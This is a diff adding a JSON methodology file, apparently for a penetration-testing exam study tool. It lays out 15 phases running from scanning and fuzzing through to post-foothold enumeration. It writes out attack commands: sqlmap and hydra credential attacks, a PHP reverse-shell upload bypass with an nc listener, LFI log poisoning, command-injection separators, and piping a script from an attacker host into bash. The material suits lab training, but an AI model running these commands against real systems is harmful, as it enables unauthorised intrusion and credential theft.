@@ -1,0 +1,382 @@
+{
+  "id": "recon-argha-dey-methodology",
+  "zone": "recon",
+  "name": "Argha Dey Master Recon Methodology",
+  "source": "Argha Dey CPENT Notes (94% scorer)",
+  "description": "15-phase end-to-end reconnaissance checklist derived from Argha Dey's notes. The chain: Nmap \u2192 Web tech fingerprint \u2192 Directory fuzzing \u2192 Hidden file/leak \u2192 Anonymous access \u2192 .git leaks \u2192 Backup files \u2192 CMS enum \u2192 Burp workflow \u2192 Credential attacks \u2192 File upload \u2192 LFI \u2192 CMDi \u2192 IoT recon \u2192 Post-foothold enum.",
+  "examHabits": [
+    "nmap -sC -sV -T4 -Pn -A -oN <ip>.txt <ip> - note every open port, not just 80/443",
+    "If FTP open: try anonymous login, binary +passive, grab everything",
+    "whatweb / check http-generator, Server header, page title, favicon for tech fingerprint",
+    "view-source the homepage - read every comment, every <a href>",
+    "curl -s http://<ip>/robots.txt and /sitemap.xml",
+    "Directory/file fuzz with feroxbuster (recursive) then ffuf, common.txt first then big.txt",
+    "Specifically probe for /.git/, /backup/, /.env, /config.php.bak, /uploads/",
+    "If .git found: git_dumper.py, then git log + git show <every commit>",
+    "If a login form exists: test for SQLi with single quote; if error, sqlmap -r request.txt --dbs --batch",
+    "If CMS identified: run the matching scanner (WPScan, etc.) and Google default creds + CVEs for the exact version",
+    "If a utility feature exists (ping/upload/search/reset-password): test command injection, file-upload bypass, IDOR, and logic-flaw abuse",
+    "Any parameter that loads a page or file: test LFI, then pivot to log poisoning",
+    "On foothold: sudo -l, SUID hunt, LinPEAS, GTFOBins, cron jobs, readable id_rsa/config secrets",
+    "Never stop at the first flag - the chain usually continues to root or pivots to a second host"
+  ],
+  "quickRef": "nmap -sC -sV -T4 -Pn -A <ip> | feroxbuster -u http://<ip>/ -k -w common.txt | whatweb http://<ip>/",
+  "steps": [
+    {
+      "phase": "Phase 1 - Network & Service Recon",
+      "techniques": [
+        "passive-recon",
+        "arp-discovery",
+        "dns-enumeration"
+      ],
+      "tools": [
+        "nmap",
+        "amass",
+        "subfinder",
+        "masscan",
+        "naabu"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Open web ports: 80, 443, 8080, 8000, 8081, 8443",
+          "action": "Run whatweb and check http-title/http-server-header/http-generator",
+          "fallback": "Proceed to full NSE script scan on non-web ports"
+        },
+        {
+          "condition": "FTP open with ftp-anon",
+          "action": "Anonymous FTP login, binary mode, passive, ls and get everything",
+          "fallback": "Check SMB for anonymous shares"
+        },
+        {
+          "condition": "Large subnet (>/16)",
+          "action": "nmap -p- -T4 --min-rate 5000 -oG allports.txt <ip>, then re-run -sV only on discovered ports",
+          "fallback": "Use full scan with -T4 -A"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 2 - Web Technology Fingerprinting",
+      "techniques": [
+        "passive-recon"
+      ],
+      "tools": [
+        "whatweb",
+        "nmap",
+        "httpx",
+        "ffuf"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "http-generator reveals WordPress x.x.x",
+          "action": "Proceed to WPScan enumeration",
+          "fallback": "Google product + version for known CVEs"
+        },
+        {
+          "condition": "Default Apache/Nginx page",
+          "action": "Fuzz for real vhost/path with feroxbuster/ffuf",
+          "fallback": "Check for hidden admin portals in page source"
+        },
+        {
+          "condition": "Second web port (8080/8081)",
+          "action": "Scan separately - common pattern: one port = public site, other = internal admin panel",
+          "fallback": "Check page source comments for employee/admin portals"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 3 - Directory, File & Vhost Fuzzing",
+      "techniques": [
+        "passive-recon"
+      ],
+      "tools": [
+        "feroxbuster",
+        "ffuf",
+        "gobuster"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Need recursive directory discovery",
+          "action": "feroxbuster -u http://<ip>/ -k -w /usr/share/seclists/Discovery/Web-Content/{common,big,raft-*.txt}",
+          "fallback": "Use ffuf for extension-aware fuzzing"
+        },
+        {
+          "condition": "extension fuzzing needed",
+          "action": "ffuf -u http://<ip>/FUZZ -w seclists/big.txt -e .php",
+          "fallback": "gobuster dir -u http://<ip>/ -w seclists/big.txt -x php,txt,bak,zip"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 4 - Anonymous Service Access (FTP / SMB)",
+      "techniques": [
+        "passive-recon"
+      ],
+      "tools": [
+        "nmap",
+        "smbclient",
+        "enum4linux",
+        "smbmap"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "FTP open on target",
+          "action": "ftp anonymous@<ip>; binary; passive; ls; get files",
+          "fallback": "Check SMB shares: smbclient -L //<ip> -N"
+        },
+        {
+          "condition": "SMB open",
+          "action": "netexec smb <ip> -u '' -p '' or smbclient -L //<ip> -N",
+          "fallback": "Proceed to LDAP anonymous bind check"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 5 - Source Code / Version Control Leaks (.git)",
+      "techniques": [
+        "file-inclusion"
+      ],
+      "tools": [
+        "feroxbuster",
+        "ffuf",
+        "git-dumper",
+        "nmap"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "/.git/ directory found (HTTP 200 on /.git/HEAD, /.git/config)",
+          "action": "git_dumper.py http://<ip>/.git/ ./dumped_dir, then git log + git show <every commit>",
+          "fallback": "wget -r http://<ip>/.git/"
+        },
+        {
+          "condition": "Commit history contains removed secrets",
+          "action": "git log -p to inspect full diffs; old commits still contain live creds",
+          "fallback": "grep -R -i -E 'pass|secret|key|token' dumped_dir/"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 6 - Backup Files & Database Dumps",
+      "techniques": [
+        "file-inclusion"
+      ],
+      "tools": [
+        "feroxbuster",
+        "ffuf",
+        "nmap"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Directory fuzzing surfaces .sql/.bak/.zip/.tar.gz files",
+          "action": "wget http://<ip>/backup/old_database.sql; grep -i -E 'insert into|user|pass' old_database.sql",
+          "fallback": "Check for security question answers for password-reset abuse"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 7 - CMS / Application-Specific Enumeration",
+      "techniques": [
+        "sql-injection"
+      ],
+      "tools": [
+        "wpscan",
+        "cmsmap",
+        "nmap",
+        "ffuf"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "WordPress detected via http-generator",
+          "action": "wpscan --url http://<ip>/ -e vp,u,vt,cb,m -v --random-user-agent --disable-tls-checks",
+          "fallback": "Enumerate users via REST API: curl /wp-json/wp/v2/users"
+        },
+        {
+          "condition": "Branded login page (OTRS, Jenkins, phpMyAdmin, Tomcat)",
+          "action": "Google '<product> default credentials' + '<product> CVE <year>'",
+          "fallback": "Try well-known default pairs even if not documented default"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 8 - Intercepting Proxy Workflow (Burp Suite)",
+      "techniques": [
+        "sql-injection"
+      ],
+      "tools": [
+        "burp-suite",
+        "sqlmap"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Form submission needs interception",
+          "action": "Proxy > Intercept on, submit form, save request to request.txt for sqlmap",
+          "fallback": "Send to Repeater for manual parameter tampering"
+        },
+        {
+          "condition": "Need to brute-force a field",
+          "action": "Send to Intruder: Cluster bomb (unknown user+pass), Sniper (one known), numeric range for OTP",
+          "fallback": "Diff rendered page vs raw HTML response for hidden tokens"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 9 - Credential Attacks",
+      "techniques": [
+        "sql-injection",
+        "password-spraying"
+      ],
+      "tools": [
+        "hydra",
+        "kerbrute",
+        "sqlmap",
+        "burp-suite"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Injectable parameter confirmed with single quote (SQL error visible)",
+          "action": "sqlmap -r request.txt -dbs --batch",
+          "fallback": "Manual UNION-based extraction"
+        },
+        {
+          "condition": "Login form with valid username known",
+          "action": "hydra -L users.txt -P passwords.txt <ip> http-post-form '/login.php:username=^USER^&password=^PASS^:Invalid'",
+          "fallback": "Use Burp Intruder with Cluster Bomb for extra form fields"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 10 - File Upload Abuse",
+      "techniques": [
+        "file-inclusion"
+      ],
+      "tools": [
+        "burp-suite",
+        "ffuf",
+        "commix"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Upload feature found with extension restriction (.pdf/.html/.image)",
+          "action": "Craft PHP reverse shell, rename to shell.php.pdf, intercept POST in Burp, rewrite filename to shell.php",
+          "fallback": "Flip hidden allow_all parameter or change Content-Type to application/octet-stream"
+        },
+        {
+          "condition": "Upload directory discovered (/uploads/, /customerdocs/)",
+          "action": "Start listener: rlwrap nc -lnvp 4444; curl http://<ip>/uploads/shell.php",
+          "fallback": "Check for client-side validation bypass comments in page source"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 11 - LFI & Log Poisoning",
+      "techniques": [
+        "lfi-advanced"
+      ],
+      "tools": [
+        "ffuf",
+        "liffy",
+        "burp-suite",
+        "curl"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "?page= parameter confirmed with traversal",
+          "action": "Test ....// bypass if ../ is filtered; then poison Apache User-Agent via curl -A",
+          "fallback": "Try auth.log, PHP session files, data:// wrapper"
+        },
+        {
+          "condition": "Log file unreachable / log poisoning blocked",
+          "action": "Try /proc/self/environ poison or PHP session file poisoning",
+          "fallback": "Use php://filter/convert.base64-encode to read config.php for DB creds"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 12 - Command Injection Recon",
+      "techniques": [
+        "cmdi-advanced"
+      ],
+      "tools": [
+        "ffuf",
+        "commix",
+        "burp-suite",
+        "curl"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Utility pages found (ping.php, diag.php, traceroute.php, nslookup.php)",
+          "action": "Test separators: ; id, | id, $(id), %0a id, URL-encoded variants",
+          "fallback": "Use commix --url=... for automatic technique detection"
+        },
+        {
+          "condition": "Injection confirmed but single-command only",
+          "action": "Check for encoded secrets via ?ip=|cat ..%2Fssh_pk_creds.txt",
+          "fallback": "Decode with CyberChef (Base64 \u2192 RC4/XOR recipe)"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 13 - IoT / Firmware Recon (adjacent)",
+      "techniques": [
+        "firmware-extraction"
+      ],
+      "tools": [
+        "binwalk",
+        "strings",
+        "file"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Firmware file discovered on IoT target",
+          "action": "binwalk <file>; binwalk -e <file>; file extracted blobs",
+          "fallback": "strings <binary> | grep -i 'busybox|gcc|linux version'"
+        },
+        {
+          "condition": "Config DB discovered (config.sqlite)",
+          "action": "sqlite3 config.sqlite .dump | grep -i <keyword>",
+          "fallback": "grep -R 'DeviceID' . for device model identification"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 14 - Post-Foothold Local Enumeration",
+      "techniques": [
+        "passive-recon"
+      ],
+      "tools": [
+        "linpeas",
+        "linenum"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Any shell obtained (webshell, reverse shell, SSH)",
+          "action": "whoami; id; hostname; uname -a; cat /etc/passwd | grep bash; sudo -l; find / -perm -4000 -type f 2>/dev/null",
+          "fallback": "Run LinPEAS: curl http://<attacker>/linpeas.sh | bash"
+        },
+        {
+          "condition": "Shell is non-interactive",
+          "action": "stabilize: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'; stty raw -echo; export TERM=xterm",
+          "fallback": "socat file:tty,raw,echo=0 tcp-listen:4444 (attacker) + socat exec:bash -li... (victim)"
+        }
+      ]
+    },
+    {
+      "phase": "Phase 15 - Master Recon Checklist (mental, every new Web Range IP)",
+      "techniques": [],
+      "tools": [
+        "nmap",
+        "whatweb",
+        "feroxbuster",
+        "ffuf",
+        "sqlmap",
+        "linpeas"
+      ],
+      "decisionPoints": [
+        {
+          "condition": "Starting a new box",
+          "action": "Run entire checklist: nmap \u2192 whatweb \u2192 view-source \u2192 robots.txt \u2192 ffuf \u2192 .git/.backup/.env \u2192 SQLi test \u2192 CMS scan \u2192 utility feature test \u2192 LFI test \u2192 foothold \u2192 sudo -l/SUID/LinPEAS",
+          "fallback": "Use the full phase list above as execution guide"
+        }
+      ]
+    }
+  ]
+}
